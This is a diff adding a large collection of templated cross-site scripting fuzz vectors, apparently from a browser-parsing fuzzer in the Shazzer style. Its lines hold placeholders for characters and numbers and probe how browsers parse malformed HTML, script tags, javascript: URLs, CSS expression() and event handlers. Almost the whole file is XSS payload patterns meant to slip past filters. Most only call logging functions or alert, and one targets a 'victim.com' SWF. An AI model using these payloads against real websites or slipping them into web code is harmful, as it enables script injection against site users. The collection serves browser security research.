@@ -1,0 +1,297 @@
+<div *chr*="><img src=xss:xss onerror=logChr(*num*)>">
+<a href="http://*chr*/" id="fuzzelement*num*">test</a>
+<a href="http://*chr*/" id="fuzzelement*num*">test</a>
+<iframe src="http://*chr*fuzz.shazzer.co.uk//" onload="if(this.contentWindow.document !== null){log(*num*)}"></iframe>
+<iframe src="http:/*chr*/google.de"></iframe>
+<iframe src="....................................................................................................................................................................................................................:::::::::::::::::::::.................................................................................................."></iframe>*chr*
+<iframe src="http*uni*//www.google.de"></iframe>
+<iframe src="http://*uni*"></iframe>
+<iframe src="*uni*://www.w3schools.com"></iframe> <iframe src="*hex6*://www.w3schools.com"></iframe>
+<frameset cols="200, *"> <frame src="*hex6*:" name="navigation"> <frame src="*uni*:" name="inhalt"> </frameset>
+<script>window.open("*num**hex2**uni*://www.w3schools.com");</script>
+<!-- sample vector --> <img src=xx:xx *chr*onerror=logChr(*num*)>
+<script>l\*chr*u006fg(*num*)</script>
+<script>l\u006f*chr*g(*num*)</script>
+<svg toto="*chr* onload="logChr(*num*);"></svg>
+<div id="fuzzelement*num*" style="background:url(about:blank?*chr*;color:#000000;x:);"></div>
+<script*chr*test>logChr(*num*)</script>
+<*chr*div style="x:expression(logChr(*num*))">
+<script>a='asdf*chr*\';logChr(*num*)//asdf'</script>
+<html> <head> <title>Possibility of XSS via lead bytes... @irsdl</title> <!-- <meta charset="utf-8"> or <meta http-equiv="Content-Type" content="text/html; charset=utf-8"> Ref: https://code.google.com/p/doctype-mirror/wiki/MetaCharsetAttribute --> </head> <body> <p><input size=20 value="*chr*"></p> <p><input size=20 value="<script>logChr(*num*)</script>"></p> <!-- References: http://powerofcommunity.net/poc2008/hasegawa.pptx http://websecurity.com.ua/2928/ https://bugzilla.mozilla.org/show_bug.cgi?id=690225 --> </body> </html>
+<*chr*foo:img src="xx:xx" id="baz*num*" /> <script> if(document.getElementById("baz*num*")) { logChr(*num*); } </script>
+<!-- sample vector --> <img src=http://www.kinmen.gov.tw/*chr* onerror=logChr(*num*)>
+<script>s*num* = *chr**num**chr*;if (typeof s*num* == "string" && s*num* == "*num*") logChr(*num*);</script>
+<!-- sample vector --> <*chr*img src=xx:xx onerror=logChr(*num*)>
+<img src=xx:xx *chr*nerror=logChr(*num*)>
+<script*chr*logChr(*num*)</script>
+<img src=xx:xx onerror*chr*logChr(*num*)>
+<img src=xx:xx onerror*chr*logChr(*num*)>
+<!-- --*chr*> <img src=xxx:x onerror=log(*num*)> -->
+<script> var obj = {"foo"*chr*"bar"}; logChr(*num*) </script>
+<script> var v = {}*chr*{"string in blockscope"} logChr(*num*) </script>
+<script> var v = {}*chr*logChr(*num*) </script>
+<a href="javascript://*chr*logChr(*num*)">aaa</a>
+<img src="about:blank" onerror*chr*=logChr(*num*)>
+<input *datahtmlattributes*="customLog('*datahtmlattributes*')" type="image" src="about:blank">
+<input *datahtmlattributes*="customLog('*datahtmlattributes*')" type="text">
+<script> *chr*"; logChr(*num*) </script>
+<script> // hmm *chr*logChr(*num*) </script>
+<script> var a = document.createElement('a'); a.href = "java\u*hex4*script:alert()"; if (a.href === "javascript:alert()") { logChr(*num*); } </script>
+<input value="" *chr*<script>logChr(*num*)</script> foo="" type="text">
+<*chr*img/src=xx:xx on*chr*error=logChr(*num*)>
+<!-- sample vector --> <img src=xx:xx *chr*onerror=logChr(*num*)>
+*chr*img src=xx:xx onerror=logChr(*num*)>
+<!--*chr*><img src=xxx:x onerror=log(*num*)> -->
+<script> var a = "olol123*chr* <logChr(*num*)// </script>
+<svg id="svg" xmlns="http://www.w3.org/2000/svg"> <rect id="rectID" width="100" height="100" fill="green"> <animate id="selfID" onbegin=logChr(*num*) attributeName="x" begin="0s; selfID.end" dur="0.5s" from="0" to="100"/> </rect> </svg>
+<*chr*,script>logChr(*num*);</script>
+<!-- sample vector --> <img src='xx:xx*chr*' onerror='logChr(*num*) baz= '>
+<script> var a={}*chr*b={}&logChr(*num*); </script>
+<object*chr*data="data:text/html;base64,PHNjcmlwdD5sb2dDaHIoKm51bSopPC9zY3JpcHQ+"></object>
+<script> var a={}*chr*b=logChr(*num*); </script>
+<script> var a={}*chr*logChr(*num*); </script>
+<!-- sample vector --> <img src=xx:xx onerror=logChr(*num*)*chr*">
+<!-- sample vector --> <img src=xx:xx *chr*onerror=logChr(*num*)>
+<a href="javascript&colon*chr*log(*num*)" id="fuzzelement*num*">test</a>
+<script src="data*chr*,log(*num*)"></script>
+<script>logChr(*num*)<*chr*script></script>
+<div style="x:expression(l&*chr*#x6F;gChr(*num*))">
+<!-- sample vector --> <img src=xx:xx *chr*onerror=logChr(*num*)>
+<img src=http://runinfinity.com/wp-content/uploads/2012/01/Kinmen_Marathon_coursemap.jpg *chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr* onerror=logChr(*num*)>
+<img src=xx:xx *chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr**chr* onerror=logChr(*num*)>
+<article onerror=log(*num*) data-animal-type="bird"> <h1>k1nm3n h@ck3r</h1> <p>test</p> <table> <tr><td>datacsspropertynames</td><td>*datacsspropertynames*</td></tr> <tr><td>datadhtmlprops</td><td>*datadhtmlprops*</td></tr> <tr><td>dataentities</td><td>*dataentities*</td></tr> <tr><td>dataevents</td><td>*dataevents*</td></tr> <tr><td>dataevil</td><td>*dataevil*</td></tr> <tr><td>datahtmlattributes</td><td>*datahtmlattributes*</td></tr> <tr><td>datahtmlelements</td><td>*datahtmlelements*</td></tr> <tr><td>datahtmlelements2</td><td>*datahtmlelements2*</td></tr> <tr><td>dataints</td><td>*dataints*</td></tr> <tr><td>datajscsspropertynames</td><td>*datajscsspropertynames*</td></tr> <tr><td>datajsproperties</td><td>*datajsproperties*</td></tr> <tr><td>datajstest</td><td>*datajstest*</td></tr> <tr><td>datajstest2</td><td>*datajstest2*</td></tr> <tr><td>datajstest3</td><td>*datajstest3*</td></tr> <tr><td>datajstest4</td><td>*datajstest4*</td></tr> <tr><td>datajstest5</td><td>*datajstest5*</td></tr> <tr><td>datamyevents</td><td>*datamyevents*</td></tr> <tr><td>dataprotocols</td><td>*dataprotocols*</td></tr> <tr><td>dataShortHtmlAttributes</td><td>*dataShortHtmlAttributes*</td></tr> <tr><td>dataShortHtmlElements</td><td>*dataShortHtmlElements*</td></tr> <tr><td>datasvgelements</td><td>*datasvgelements*</td></tr> </table> </article>
+<article onerror=log(*num*) data-animal-type="bird"> <h1>k1nm3n h@ck3r</h1> <p>test</p> <table> <tr><td>datacsspropertynames</td><td>*datacsspropertynames*</td></tr> <tr><td>datadhtmlprops</td><td>*datadhtmlprops*</td></tr> <tr><td>dataentities</td><td>*dataentities*</td></tr> <tr><td>dataevents</td><td>*dataevents*</td></tr> <tr><td>dataevil</td><td>*dataevil*</td></tr> <tr><td>datahtmlattributes</td><td>*datahtmlattributes*</td></tr> <tr><td>datahtmlelements</td><td>*datahtmlelements*</td></tr> <tr><td>datahtmlelements2</td><td>*datahtmlelements2*</td></tr> <tr><td>dataints</td><td>*dataints*</td></tr> <tr><td>datajscsspropertynames</td><td>*datajscsspropertynames*</td></tr> <tr><td>datajsproperties</td><td>*datajsproperties*</td></tr> <tr><td>datajstest</td><td>*datajstest*</td></tr> <tr><td>datajstest2</td><td>*datajstest2*</td></tr> <tr><td>datajstest3</td><td>*datajstest3*</td></tr> <tr><td>datajstest4</td><td>*datajstest4*</td></tr> <tr><td>datajstest5</td><td>*datajstest5*</td></tr> <tr><td>datamyevents</td><td>*datamyevents*</td></tr> <tr><td>dataprotocols</td><td>*dataprotocols*</td></tr> <tr><td>dataShortHtmlAttributes</td><td>*dataShortHtmlAttributes*</td></tr> <tr><td>dataShortHtmlElements</td><td>*dataShortHtmlElements*</td></tr> <tr><td>datasvgelements</td><td>*datasvgelements*</td></tr> </table> </article>
+<img src="http://140.134.25.107/?chr=*chr*&num=*num*" onerror=logChr(*num*)>
+<audio controls> <source src="*chr*.*chr*" type="*chr*/*chr*" onerror= log(*num*)> Your browser does not support the audio element. </audio>
+<svg*chr*onload=logChr(*num*)>
+<script>/^\d$/.test('*chr*')&&logChr(*num*);</script>
+<script> if(/\s/.test('*uni*')&&!/./.test('*uni*'))logChr(*num*) </script>
+<script> if(/\s/.test('*chr*'))logChr(*num*) </script>
+<script language="vbscript"> '*chr*log(*num*)' </script>
+<body onload=throw[onerror=a=*chr*logChr(*num*),a]>
+<input onfocus=*chr*:alert(1) autofocus>
+<a href="http://*chr*javascript:alert(1)">testxss</a>
+<img src== onerror="a*chr*logChr(*num*)">
+<progress value="*num*" max="*num*"></progress>
+<*chr* width="*num*px">*datajstest4**datajstest4**datajstest4**dataShortHtmlAttributes**dataShortHtmlAttributes**dataShortHtmlAttributes**datajstest4*
+<img src=xx:xx o*chr*nerror=logChr(*num*)>
+<!-- sample vector --> <img src=xx:xx *chr*onerror=logChr(*num*)>
+<!-- sample vector --> <img src=xx:xx *chr*onerror=logChr(*num*)>*num**datajstest4**datacsspropertynames**datacsspropertynames*
+<script> *chr*"; logChr(*num*); </script>
+<a href="http://google.com*chr*breakme" id="fuzzelement*num*">test</a>
+<a href="http://*chr*google.com" id="fuzzelement*num*">test</a>
+<ifr*chr*ame id="lol*num*" src="http://shazzer.co.uk" onload=logChr(*num*);> <i>:)</i> </iframe>
+<script> function report*num*(num){ var lol = document.getElementById('lol*num*'); if(/http:\/\/shazzer/.test(lol.src)){ logChr(*num*); } } </script> <iframe id="lol*num*" src="http://*chr*shazzer.co.uk" onload=report*num*(*num*)> <p>The browser does not support iframes.</p> </iframe>
+<command onmouseover ="\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x63\x6F\x6E\x66\x69\x72\x6D\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B">Save</command>*datajscsspropertynames*
+<script> function report*num*(num){ var lol = document.getElementById('lol*num*'); if(/uk\//.test(lol.src)){ logChr(*num*); } } </script> <iframe id="lol*num*" src="http://shazzer.co.uk*chr*break" onload=report*num*(*num*)> <p>The browser does not support iframes.</p> </iframe>
+<script>logChr(*num*)<*chr*script>
+<script> lo\u*chr*0067Chr(*num*); </script>
+<script> lo\*chr*0067Chr(*num*); </script>
+<!-- -*chr*-> <script>logChr(*num*)</script> -->
+<script> logChr*chr*(*num*); </script>
+<script> setTimeout("if(document.getElementById('myframe*dataprotocols*').contentWindow.document.location.hash.substring(1)) customLog('*dataprotocols*');",1000) </script> <iframe id="myframe*dataprotocols*" src="http://victim.com/testme/flashtest/link_protocol_test.swf?input=*dataprotocols*javascript:document.location='http://shazzer.co.uk/%23@irsdl'"></iframe>
+<*chr*script> logChr(*num*) </script>
+<script>logChr(*num*)*chr*'</script>
+<script>logChr(*num*)/*chr*/'</script>
+<script>logChr(*num*)<*chr*!-- '</script>
+<script> var a = "*chr* "; logChr(*num*); </script>
+<script> var a=*chr*'; logChr(*num*); </script>
+<script> if(document.*chr*body === document.body) { logChr(*num*); } </script>
+<script> var x = "*chr*\"; logChr(*num*); </script>
+<img src="1*chr* onerror="logChr(*num*)">
+<img src=*chr* onload=logChr(*num*)>
+<script> function a() {} </script> <img src=1 onerror="a()*chr*logChr(*num*)">
+<img src=1 onerror="*chr*logChr(*num*)">
+<img src=1 onerror*chr*"logChr(*num*)">
+<svg><script>lo<*chr*>gChr(*num*)</script></svg>
+<img src=# aaa*chr*onerror="logChr(*num*)">
+<*chr*a href=x onerror=logChr(*num*)>
+<script> var x = "asdf\*chr* asdf"; logChr(*num*); </script>
+<img*chr*src=xx:xx*chr*onerror=logChr(*num*)>
+<img src=x *chr*> onerror="console.log(document.getElementsByTagName('html')[0].innerHTML)">
+<script> chr=String.fromCharCode(*num*); result=''; try{ result=encodeURIComponent(chr); }catch(e){} if(!/%/.test(result)&&result.length) { ids.push(*num*); } </script>
+<script> chr=String.fromCharCode(*num*); result=''; try{ result=encodeURI(chr); }catch(e){} if(!/%/.test(result)&&result.length) { ids.push(*num*); } </script>
+<img src=x *chr*> onerror=logChr(*num*)>
+<img src=x *chr*> onerror=logChr(*num*)>
+<a href="javascript*chr*:alert(1)" id="fuzzelement*num*">test</a>
+<a href="javascript&co*chr*lon;alert(1)" id="fuzzelement*num*">test</a>
+<a href="*chr*javascript:alert(1)" id="fuzzelement*num*">test</a>
+<script> str=*datajstest*+*datajstest2*+*datajstest3*+*datajstest4*+''; result=''; try{result=eval(str)}catch(e){}; if(result === 2147483647) { customLog(str); } </script>
+<script> str=*datajstest*+*datajstest2*+*datajstest3*+*datajstest4*+*datajstest5*+''; result=''; try{result=eval(str)}catch(e){}; if(result === 2147483647) { customLog(str); } </script>
+<svg><script*chr*>logChr(*num*)</script></svg>
+htmlStr = '<div title="'+*dataentities*.replace(/;/,'')+'">test</div>'; document.getElementById('placeholder').innerHTML = htmlStr; try { if(document.getElementById('placeholder').firstChild.title.length===1) { customLog(*dataentities*); } }catch(e){};
+<img src=xx:xx onerror="&*chr*#X61;lert(*num*);logChr(*num*)">
+<img src=xx:xx onerror=window[['log*chr*Chr']](*num*)>
+<img src=xx:xx onerror=window[['logChr*chr*']](*num*)>
+<a href="*chr*//google.com" id="fuzzelement*num*">test</a>
+<a href="/*chr*/google.com" id="fuzzelement*num*">test</a>
+<a href="http:*chr**chr*google.com" id="fuzzelement*num*">test</a>
+<a href="http:*chr*google.com" id="fuzzelement*num*">test</a>
+<a href="http:/*chr*/google.com" id="fuzzelement*num*">test</a>
+<a href="ht*chr*tp://google.com" id="fuzzelement*num*">test</a>
+"'><img src="xx:xx" on*chr*error="log(*num*);">
+<div id="fuzzelement*num*" expando*chr*="123">test</div>
+<div id="fuzzelement*num*" expando*chr*=123>test</div>
+<!-- sample vector --> <*chr*img src=xx:xx onerror=logChr(*num*)>
+<!-- sample vector --> <img src=xx:xx onerror*chr*logChr(*num*)>
+<!-- sample vector --> <META HTTP-EQUIV="refresh" CONTENT="0.1; URL=javascript:void()//?*chr*;URL=javascript:logChr(*num*)//">
+<iframe src=http://businessinfo.co.uk onload="if(/^http:\/\/businessinfo.co.uk\/?/.test(this.contentWindow.location)){logBoolean(true);}else{logBoolean(false)}"></iframe>
+<meta http-equiv=refresh content="0*chr*javascript:logChr('*num*')">
+<a href="java*chr*script:alert(1)" id="fuzzelement*num*">test</a>
+<!-- sample vector --> <img*chr*src=xx:xx onerror=logChr(*num*)>
+<a href="*chr**chr*google.com" id="fuzzelement*num*">test</a>
+<a href="javascript*chr*alert(1)" id="fuzzelement*num*">test</a>
+<script> document.cookie='*chr*'; if(document.cookie !== '*chr*') { logChr(*num*,document.cookie); } </script>
+<*datahtmlelements* onload="customLog('*datahtmlelements*')">test</*datahtmlelements*>
+htmlStr = '<a href="javascript&colon'+*chr*+'123">test</a>'; document.getElementById('placeholder').innerHTML = htmlStr; try { if(document.getElementById('placeholder').firstChild.protocol === 'javascript:') { logChr(*num*); } }catch(e){};
+htmlStr = '<a href="javascript&col'+*chr*+'on;123">test</a>'; document.getElementById('placeholder').innerHTML = htmlStr; try { if(document.getElementById('placeholder').firstChild.protocol === 'javascript:') { logChr(*num*); } }catch(e){};
+htmlStr = '<a href="javascript&colon'+*chr*+'123">test</a>'; document.getElementById('placeholder').innerHTML = htmlStr; try { if(document.getElementById('placeholder').firstChild.protocol === 'javascript:') { logChr(*chr*); } }catch(e){};
+<*chr* script>logChr(*num*)</script>
+<img src=x:xx onerror="try {execScript('*chr*=1','vbs');log(*num*);}catch(e){}">
+<svg><script xlink:href=YWxl*chr*cnQoMSk= ></script>
+<*chr*cript>logChr(*num*)</script>
+*chr*script>logChr(*num*)</script>
+<scr*chr*ipt>logChr(*num*)</script>
+<*chr*script>logChr(*num*)</script>
+<img src=*chr* onload=logChr(*num*)>
+<!-- sample vector --> <img src=xx:xx *chr*onerror=logChr(*num*)>
+<img src="x" asdf/="_=" alt=" *dataentities*onerror=logChr(*num*) //">
+htmlStr = '<a href="javascript'+*dataentities*+'123">test</a>'; document.getElementById('placeholder').innerHTML = htmlStr; try { if(document.getElementById('placeholder').firstChild.protocol === 'javascript:') { customLog(*dataentities*); } }catch(e){};
+htmlStr = '<a href="javascript'+*dataentities*+':123">test</a>'; document.getElementById('placeholder').innerHTML = htmlStr; try { if(document.getElementById('placeholder').firstChild.protocol === 'javascript:') { customLog(*dataentities*); } }catch(e){};
+htmlStr = '<a href="'+*dataentities*+'javascript:123">test</a>'; document.getElementById('placeholder').innerHTML = htmlStr; try { if(document.getElementById('placeholder').firstChild.protocol === 'javascript:') { customLog(*dataentities*); } }catch(e){};
+htmlStr = '<a href="java'+*dataentities*+'script:123">test</a>'; document.getElementById('placeholder').innerHTML = htmlStr; try { if(document.getElementById('placeholder').firstChild.protocol === 'javascript:') { customLog(*dataentities*); } }catch(e){};
+htmlStr = '<div style="'+*dataentities*+'color:#cccccc;"></div>'; document.getElementById('placeholder').innerHTML = htmlStr; if(document.getElementById('placeholder').firstChild.style.color.length) { customLog(*dataentities*); }
+<div style="color:red'{}*chr* x:expression(logChr(*num*))*chr*">.</div>
+<img src='xx:x*chr*><img src=xx:x onerror=logChr(*num*)>'>
+<img src='xx:x\*chr* onerror="logChr(*num*)">'>
+<img src='xx:x*chr* onerror="logChr(*num*)">'>
+<*datahtmlelements* value="1" *datadhtmlprops*="test" *dataevents*="test" *datahtmlattributes*="test">1</*datahtmlelements*><script>if(test == "1") parent.customLog('<*datahtmlelements* value="1" *datadhtmlprops*="test" *dataevents*="test" *datahtmlattributes*="test">1</*datahtmlelements*>');</script>
+`"'><img src="#*chr* onerror=log(*num*)>
+<img src=xx:xx onerror="x='*chr*\',logChr(*num*)//'">
+<script>alert(logChr(*num*))</*chr*script>
+<script>alert(logChr(*num*))<*chr*/script>
+<script>x='<*chr*script><img src=xx:xx onerror=logChr(*num*)>';</script>
+<script>log(*num*)<*chr*script></script>
+--><!-- -*chr*-> <img src=xxx:x onerror=log(*num*)> -->
+<img src=xx:xx onerror="*num*<=0xffff&&/./.test('*uni*')&&/\s/.test('*uni*')&&logChr(*num*)">
+<img src=xx:xx onerror="!/./.test('*uni*')&&/\s/.test('*uni*')&&logChr(*num*)">
+<img*chr*src=xx:xx*chr*onerror=logChr(*num*)>
+<img src=xx:xx#*chr*/onerror=logChr(*num*)>
+<img src=xx:xx alt=`*chr*/onerror=logChr(*num*)//`>
+<img src="http://media.merchantcircle.com/37102644/Alert1_Logo_without_tag_full.jpeg*chr*javascript:alert(*chr*)">
+<*chr*script>alert(*num*)</script>
+<!-- sample vector --> <img src=xx:xx *chr*onerror=logChr(*num*)> <a href=javascript*chr*:alert(*num*)>*num*</a>
+<*datahtmlelements*>&lt;</*datahtmlelements*> <*datahtmlelements*/>&lt;</*datahtmlelements*>
+<script> !function(){ var a = document.createElement('a'); a.href='http://\*chr*somehost.com'; if(a.protocol === 'http:' && a.host === '/somehost.com') { logChr(*num*); } }() </script>
+<script> !function(){ var a = document.createElement('a'); a.href='http://\*chr*somehost.com'; if(a.protocol === 'http:' && a.host === '>somehost.com') { logChr(*num*); } }() </script>
+<script> !function(){ var a = document.createElement('a'); a.href='http://\*chr*somehost.com'; if(a.protocol === 'http:' && a.host === '<somehost.com') { logChr(*num*); } }() </script>
+<script> !function(){ var a = document.createElement('a'); a.href='http://\*chr*somehost.com'; if(a.protocol === 'http:' && a.host === '_somehost.com') { logChr(*num*); } }() </script>
+<script> !function(){ var a = document.createElement('a'); a.href='http://\*chr*omehost.com'; if(a.protocol === 'http:' && a.host === 'somehost.com') { logChr(*num*); } }() </script>
+<script> !function(){ var a = document.createElement('a'); a.href='\*chr*ttp://somehost.com'; if(a.protocol === 'http:' && a.host === 'somehost.com') { logChr(*num*); } }() </script>
+<script> !function(){ var a = document.createElement('a'); a.href='http:\*chr*somehost.com'; if(a.host === 'somehost.com') { logChr(*num*); } }() </script>
+<script> !function(){ var a = document.createElement('a'); a.href='http://\*chr*somehost.com'; if(a.host === 'somehost.com') { logChr(*num*); } }() </script>
+<script> !function(){ var a = document.createElement('a'); a.href='http:\*chr*//somehost.com'; if(a.host === 'somehost.com') { logChr(*num*); } }() </script>
+<script> !function(){ var a = document.createElement('a'); a.href='/\*chr*/somehost.com'; if(a.host === 'somehost.com') { logChr(*num*); } }() </script>
+<script>log(*num*,1</script*chr*//)</script>
+<script>log(*num*,1</script*chr*/)</script>
+<!-- sample vector --> <img src=xx:xx *chr*onerror=logChr(*num*)>*datadhtmlprops**datadhtmlprops**datadhtmlprops**datadhtmlprops**hex6**uni*
+<body> 搂iframe onload=confirm(/xss/)&gt; <img src=x:x onerror="innerHTML=previousSibling.nodeValue.replace('搂','<')"> </body> *urlenc*
+<div id="fuzzelement*num*" style="/**\*hex2*/;color:#000000;"></div>
+<div id="fuzzelement*num*" style="/***chr*/;color:#000000;"></div>
+<iframe src="http://businessinfo.co.uk" id="iframe"></iframe> <script> window.addEventListener('load', function(){ props=props.concat(Object.getOwnPropertyNames(document)); for(var i=-100;i<100;i++) { props.push(i); } props.forEach(function(){ try{ if(document.getElementById('iframe').contentDocument[arguments[0]])customLog(arguments[0]); }catch(e){}; }) }, false); </script>
+<iframe src="http://businessinfo.co.uk" id="iframe"></iframe> <script> window.addEventListener('load', function(){ props=props.concat(Object.getOwnPropertyNames(document)); for(var i=-100;i<100;i++) { props.push(i); } props.forEach(function(){ try{ if(document.getElementById('iframe').contentWindow[arguments[0]])customLog(arguments[0]); }catch(e){}; }) }, false); </script>
+<script> props=props.concat(Object.getOwnPropertyNames(document.body)); for(var i=-100;i<100;i++) { props.push(i); } props.forEach(function(){ if(document.body[arguments[0]])customLog(arguments[0]); }) </script>
+<script> props=props.concat(Object.getOwnPropertyNames(document)); for(var i=-100;i<100;i++) { props.push(i); } props.forEach(function(){ try{ if(document[arguments[0]])customLog(arguments[0]); }catch(e){}; }) </script>
+<script> props=props.concat(Object.getOwnPropertyNames(function(){})); for(var i=-100;i<100;i++) { props.push(i); } props.forEach(function(){ if(function(){}[arguments[0]])customLog(arguments[0]); }) </script>
+<script> props=props.concat(Object.getOwnPropertyNames({})); for(var i=-100;i<100;i++) { props.push(i); } props.forEach(function(){ if({}[arguments[0]])customLog(arguments[0]); }) </script>
+<script> props=props.concat(Object.getOwnPropertyNames(new Number(123))); for(var i=-100;i<100;i++) { props.push(i); } props.forEach(function(){ if((123)[arguments[0]])customLog(arguments[0]); }) </script>
+<script> props=props.concat(Object.getOwnPropertyNames(window)); for(var i=-100;i<100;i++) { props.push(i); } props.forEach(function(){ if(''[arguments[0]])customLog(arguments[0]); }) </script>
+<script> props=props.concat(Object.getOwnPropertyNames(/a/)); for(var i=-100;i<100;i++) { props.push(i); } props.forEach(function(){ if(/a/[arguments[0]])customLog(arguments[0]); }) </script>
+<script> props=props.concat(Object.getOwnPropertyNames([])); for(var i=-100;i<100;i++) { props.push(i); } props.forEach(function(){ if([][arguments[0]])customLog(arguments[0]); }) </script>
+<script> props=props.concat(Object.getOwnPropertyNames(window)); for(var i=-100;i<100;i++) { props.push(i); } props.forEach(function(){ if(window[arguments[0]])customLog(arguments[0]); }) </script>
+<b id="id1" x=begin0x9fa0end >`'"></b><script>if (!/begin.end/.test(document.getElementById('id1').getAttribute('x'))) { alert(1);}</script>
+<b id="id1" x=begin0x2924end >`'"></b><script>if (!/begin.end/.test(document.getElementById('id1').getAttribute('x'))) { alert(1);}</script>
+<img src=# onerror*chr*"log(*num*)" >
+<title>hello*chr*<*chr**raw1*><script>alert(*num*)</script></title>
+<div id="fuzzelement*num*" style="color:r*chr*gb(0,0,0);"></div>
+<div id="fuzzelement*num*" style="color:*chr*rgb(0,0,0);"></div>
+<div id="fuzzelement*num*" style="color:rgb*chr*(0,0,0);"></div>
+<div id="fuzzelement*num*" style="color:rgb(0,0,0)*chr*junk;"></div>
+<div style="xss:expression(logChr(*num*))\*hex2* junk"></div>
+<div style="xss:expression(logChr(*num*))'*chr*junk"></div>
+<div style="xss:expression(logChr(*num*))*chr**chr*junk"></div>
+<div style="xss:expression(logChr(*num*))*chr*junk"></div>
+<div style="xss:expression(logChr*chr**num*))">test</div>
+<img src=1 title= x:xx*chr*/onerror=logChr(*num*)>
+<script>if("x\*chr*".length==2) { log(*num*);}</script>
+<script>if("x\*chr*".length==1) { log(*num*);}</script>
+<img src=xxx:xxx title=1*chr*/onerror=logChr(*num*)>
+<script>if("x*chr*x" == "xx") { log(*num*);}</script>
+<img src=x on*chr*Error="javascript:log(*num*)"/>
+"`'><script>lo*chr*g(*num*)</script>
+*chr*script>log(*num*)</script>
+<script*chr*type="text/javascript">log(*num*);</script>
+<b id="id*num*" x=begin*chr*end >`'"></b><script>if (!/begin.end/.test(document.getElementById('id*num*').getAttribute('x'))) { log(*num*);}</script>
+<script charset='*chr*>log(*num*)</script>
+<script charset="*chr*>log(*num*)</script>
+<script> "\ud83d\u*hex4*".match(/.*<.*/) ? log(*num*) : null; </script>
+<a href="javascript&*chr*colon;log(*num*)" id="fuzzelement*num*">test</a>
+<style></style*chr*<img src="about:blank" onerror=log(*num*)//></style>
+<script>a='abc\*chr*\';log(*num*)//def';</script>
+<*datahtmlelements* data=about:blank background=about:blank action=about:blank type=image/gif src=about:blank href=about:blank *dataevents*="customLog('*datahtmlelements* *dataevents*')"></*datahtmlelements*>
+<*datahtmlelements* *dataevents*="javascript:parent.customLog('*datahtmlelements* *dataevents*')"></*datahtmlelements*>
+<*datahtmlelements* *datahtmlattributes*="javascript:parent.customLog('*datahtmlelements* *datahtmlattributes*')"></*datahtmlelements*>
+<*datahtmlelements* src=1 href=1 onerror="customLog('*datahtmlelements*')"></*datahtmlelements*>
+<script>try{eval("<></>");logBoolean(1)}catch(e){logBoolean(0)};</script>
+<div class="foo*num**chr*bar">HELLO</div> <script>document.getElementsByClassName('foo*num*')[0]?log(*num*):0</script>
+"`'/><img/onload=log(*num*) src="http://shazzer.co.uk*chr*/favicon.ico"/>
+<script>log(*num*)<*chr*script>
+<!--*chr*<img src=xxx:x onerror=log(*num*)> -->
+<script>log(*num*)</script*chr*
+<script> if ('*uni*' === encodeURIComponent('*uni*')) { log(*num*); } </script>
+<script> if ('*uni*' === encodeURI('*uni*')) { log(*num*); } </script>
+<script*chr*>log(*num*)</script>
+<div id="fuzzelement*num*"> <div title="*chr*style=color:#FF1133;" id="copyTarget*num*">*num* - test</div> </div>
+<div id="fuzzelement*num*"> <div title="&#x*hex6*;style=color:#FF1133" id="copyTarget*num*">*num* - test</div> </div>
+"`'><sc*chr*ript>log(*num*)</sc*chr*ript>
+"/><img/onerror=*chr*log(*num*)*chr*src=xxx:x />
+<img src="x"*chr**chr*o*chr*n*chr*error="alert(*num*)">
+*chr*script*chr* log(*num*) *chr**chr*script*chr
+*chr*script*chr alert(1) *chr**chr*script*chr
+`"'><img src='#*chr* onerror=log(*num*)>
+<a href="javascript*chr*alert(1)" id="fuzzelement*num*">test</a>
+<div id="fuzzelement*num*"> <div title="*chr**chr*style=color:#FF1133" id="copyTarget*num*">*num* - test</div> </div>
+<script>/* **chr*/log(*num*)// */</script>
+"'`>ABC<div style="font-family:'foo*chr*;x:expression(log(*num*));/*';">DEF
+"'`>ABC<div style="font-family:'foo'*chr*x:expression(log(*num*));/*';">DEF
+"'`><script>a=/hello;*chr*;i=0;log(*num*);a/i;</script>
+<a href="*chr*><script>log(*num*)</script>" />
+"'`><p><svg><script>a='hello*chr*;log(*num*)//';</script></p>
+<p><svg><script>*chr*og(*num*)</script></p>
+<p><svg><script>l*chr*og(*num*)</script></p>
+<p><svg><script>*chr*log(*num*)</script></p>
+<script> if ('*chr*'.replace(/\s/g, '') === '') { log(*num*); } </script>
+<script>log(*num*)<*chr*/script>
+<iframe src="vbscript:log*chr**num*"></iframe>
+<iframe src="vbs:log*chr**num*"></iframe>
+ABC<div style="x:expression*chr*(log(*num*))">DEF
+ABC<div style="x:exp*chr*ression(log(*num*))">DEF
+ABC<div style="x:*chr*expression(log(*num*))">DEF
+ABC<div style="x*chr*expression(log(*num*))">DEF
+<script src="data:text/plain*chr*log(*num*)"></script>
+<script src="data:*chr*,log(*num*)"></script>
